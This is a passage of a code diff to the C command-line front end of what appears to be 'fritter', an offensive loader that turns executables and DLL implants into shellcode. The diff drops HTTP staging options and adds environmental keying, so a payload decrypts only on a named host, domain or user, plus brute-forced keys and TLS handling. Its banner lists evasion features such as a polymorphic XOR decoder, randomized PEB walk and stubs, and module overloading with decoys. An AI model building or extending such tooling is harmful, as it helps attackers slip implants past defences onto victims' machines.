-        printf("    -j, --decoy   <path>      Decoy module for Module Overloading\n");
-        printf("    -g, --chunked <0-1>       (deprecated; dispatch shim always used)\n\n");
-
-        printf("  STAGING\n");
-        printf("    -n, --modname <name>      Module name for HTTP staging\n");
-        printf("    -s, --server  <url>       Server URL (supports basic auth)\n\n");
+        printf("    -j, --decoy   <path>      Decoy module for Module Overloading\n\n");
 
         printf("  EXAMPLES\n");
         printf("    fritter -i payload.exe\n");
         printf("    fritter -i implant.dll -m RunMain -p \"arg1 arg2\"\n");
-        printf("    fritter -i loader.dll -c TestClass -m Run -s http://10.0.0.1/mod/\n");
+        printf("    fritter -i loader.dll -c TestClass -m Run\n");
     }
     printf("\n");
     exit (0);
@@ -3477,7 +4425,6 @@ int main(int argc, char *argv[]) {
     int          err;
     char         *mod_type;
     char         *arch_str = "amd64";
-    char         *inst_type[2]= { "Embedded", "HTTP" };
 
     enable_ansi();
     print_banner();
@@ -3486,7 +4433,6 @@ int main(int argc, char *argv[]) {
     memset(&c, 0, sizeof(c));
     
     // default settings
-    c.inst_type = FRITTER_INSTANCE_EMBED;   // file is embedded
     c.arch      = FRITTER_ARCH_X64;         // x64 only
     c.headers   = FRITTER_HEADERS_OVERWRITE;// overwrites PE headers
     c.format    = FRITTER_FORMAT_BINARY;    // default output format
@@ -3496,6 +4442,7 @@ int main(int argc, char *argv[]) {
     c.chunked   = 1;                      // legacy flag; retained for CLI compat, unused under dispatch
     
     // get options
+    reject_unknown_opts(argc, argv);
     get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       "h;?", "help",            usage);
     get_opt(argc, argv, OPT_TYPE_DEC,    &c.headers, "k",   "headers",         validate_headers);
     get_opt(argc, argv, OPT_TYPE_STRING, c.cls,      "c",   "class",           NULL);
@@ -3504,25 +4451,44 @@ int main(int argc, char *argv[]) {
     get_opt(argc, argv, OPT_TYPE_DEC,    &c.format,  "f",   "format",          validate_format);
     get_opt(argc, argv, OPT_TYPE_STRING, c.input,    "i",   "input;file",      NULL);
     get_opt(argc, argv, OPT_TYPE_STRING, c.method,   "m",   "method;function", NULL);
-    get_opt(argc, argv, OPT_TYPE_STRING, c.modname,  "n",   "modname",         NULL);
     get_opt(argc, argv, OPT_TYPE_STRING, c.decoy,    "j",   "decoy",           NULL);
     get_opt(argc, argv, OPT_TYPE_STRING, c.output,   "o",   "output",          NULL);
     get_opt(argc, argv, OPT_TYPE_STRING, c.args,     "p",   "params;args",     NULL);
     get_opt(argc, argv, OPT_TYPE_STRING, c.runtime,  "r",   "runtime",         NULL);
-    get_opt(argc, argv, OPT_TYPE_STRING, c.server,   "s",   "server",          NULL);
     get_opt(argc, argv, OPT_TYPE_FLAG,   &c.thread,  "t",   "thread",          NULL);
     get_opt(argc, argv, OPT_TYPE_FLAG,   &c.unicode, "w",   "unicode",         NULL);
+    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.imgbase, "b",   "imagebase",       NULL);
+    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.allow_tls, "a", "allow-tls",       NULL);
+    get_opt(argc, argv, OPT_TYPE_STRING, c.tls_donor, "l",  "tls-donor",       NULL);
+    if(c.allow_tls) printf("  WARNING: static TLS check disabled. Thread-local data in the payload will not work.\n");
     get_opt(argc, argv, OPT_TYPE_DEC,    &c.exit_opt,"x",   "exit",            validate_exit);
+    {
+      // instance key options; "0" for --key-brute means none
+      static const char *kn[3] = { "COMPUTERNAME=", "USERDNSDOMAIN=", "USERNAME=" };
+      static char *ko[3] = { "key-host", "key-domain", "key-user" };
+      char kv[OPT_MAX_STRING + 1];
+      int  kb = -2, ki;
+      get_opt(argc, argv, OPT_TYPE_DEC, &kb, NULL, "key-brute", NULL);
+      if(kb != -2) c.key_brute = (kb <= 0) ? -1 : kb;
+      for(ki = 0; ki < 3; ki++) {
+        kv[0] = 0;
+        get_opt(argc, argv, OPT_TYPE_STRING, kv, NULL, ko[ki], NULL);
+        if(kv[0] == 0) continue;
+        if(strlen(kv) + strlen(kn[ki]) >= sizeof(c.key_env[ki])) { fprintf(stderr, "  ERROR: Value too long: %s\n", kv); return 1; }
+        strcpy(c.key_env[ki], kn[ki]); strcat(c.key_env[ki], kv);
+      }
+      kv[0] = 0;
+      get_opt(argc, argv, OPT_TYPE_STRING, kv, NULL, "key-env", NULL);
+      if(kv[0] != 0) {
+        if(strchr(kv, '=') == NULL || kv[0] == '=') { fprintf(stderr, "  ERROR: --key-env takes NAME=VALUE\n"); return 1; }
+        strcpy(c.key_env[3], kv);
+      }
+    }
     get_opt(argc, argv, OPT_TYPE_HEX,    &c.oep,     "y",   "oep;fork",        NULL);
     get_opt(argc, argv, OPT_TYPE_DEC,    &c.chunked, "g",   "chunked",         NULL);
     // no file? show usage and exit
     if(c.input[0] == 0) {
       usage();
-    }
-    
-    // server specified?
-    if(c.server[0] != 0) {
-      c.inst_type = FRITTER_INSTANCE_HTTP;
     }
     
     // generate loader from configuration
@@ -3588,14 +4554,10 @@ int main(int argc, char *argv[]) {
 
         printf(C_YEL "  OUTPUT" C_RST "\n");
         printf("    Shellcode   " C_WHT C_BOLD "%s" C_RST "\n", c.output);
-        printf("    Instance    " C_WHT "%s" C_RST "\n", inst_type[c.inst_type - 1]);
+        printf("    Instance    " C_WHT "Embedded" C_RST "\n");
         printf("    Arch        " C_WHT "%s" C_RST "\n", arch_str);
         printf("    Exit        " C_WHT "%s" C_RST "\n", exit_str);
         if(c.oep) printf("    OEP         " C_WHT "0x%"PRIX32 C_RST "\n", c.oep);
-        if(c.inst_type == FRITTER_INSTANCE_HTTP) {
-          printf("    Module      " C_WHT "%s" C_RST "\n", c.modname);
-          printf("    Server      " C_WHT "%s" C_RST "\n", c.server);
-        }
         printf("\n");
 
         printf(C_YEL "  PROTECTIONS" C_RST "\n");
@@ -3606,6 +4568,12 @@ int main(int argc, char *argv[]) {
         printf("    Decoder     " C_WHT "Polymorphic XOR" C_RST "\n");
         printf("    PEB Access  " C_WHT "TEB-indirect (gs:0x30+0x60)" C_RST "\n");
         if(c.decoy[0]) printf("    Decoy       " C_WHT "%s" C_RST "\n", c.decoy);
+        if(c.tls_donor[0]) printf("    TLS donor   " C_WHT "%s" C_RST "\n", c.tls_donor);
+        {
+          int kb = (c.entropy != FRITTER_ENTROPY_DEFAULT || c.key_brute < 0) ? 0 : (c.key_brute ? c.key_brute : FRITTER_KEY_BRUTE_DEFAULT), ki;
+          if(kb) printf("    Key         %s%d bits found by trial at load%s\n", C_WHT, kb, C_RST);
+          for(ki = 0; ki < 4; ki++) if(c.key_env[ki][0]) printf("    Key         %sonly where %s%s\n", C_WHT, c.key_env[ki], C_RST);
+        }
         printf("    PEB Walk    " C_WHT "Randomized" C_RST "\n");
         printf("    Entry Stub  " C_WHT "Randomized" C_RST "\n");
         printf("    Padding     " C_WHT "Randomized" C_RST "\n");
@@ -3628,14 +4596,10 @@ int main(int argc, char *argv[]) {
 
         printf("  OUTPUT\n");
         printf("    Shellcode   %s\n", c.output);
-        printf("    Instance    %s\n", inst_type[c.inst_type - 1]);
+        printf("    Instance    Embedded\n");
         printf("    Arch        %s\n", arch_str);
         printf("    Exit        %s\n", exit_str);
         if(c.oep) printf("    OEP         0x%"PRIX32"\n", c.oep);
-        if(c.inst_type == FRITTER_INSTANCE_HTTP) {
-          printf("    Module      %s\n", c.modname);
-          printf("    Server      %s\n", c.server);
-        }
         printf("\n");
 
         printf("  PROTECTIONS\n");
@@ -3646,6 +4610,12 @@ int main(int argc, char *argv[]) {
         printf("    Decoder     Polymorphic XOR\n");
         printf("    PEB Access  TEB-indirect (gs:0x30+0x60)\n");
         if(c.decoy[0]) printf("    Decoy       %s\n", c.decoy);
+        if(c.tls_donor[0]) printf("    TLS donor   %s\n", c.tls_donor);
+        {
+          int kb = (c.entropy != FRITTER_ENTROPY_DEFAULT || c.key_brute < 0) ? 0 : (c.key_brute ? c.key_brute : FRITTER_KEY_BRUTE_DEFAULT), ki;
+          if(kb) printf("    Key         %s%d bits found by trial at load%s\n", "", kb, "");
+          for(ki = 0; ki < 4; ki++) if(c.key_env[ki][0]) printf("    Key         %sonly where %s%s\n", "", c.key_env[ki], "");
+        }
         printf("    PEB Walk    Randomized\n");
         printf("    Entry Stub  Randomized\n");
         printf("    Padding     Randomized\n");
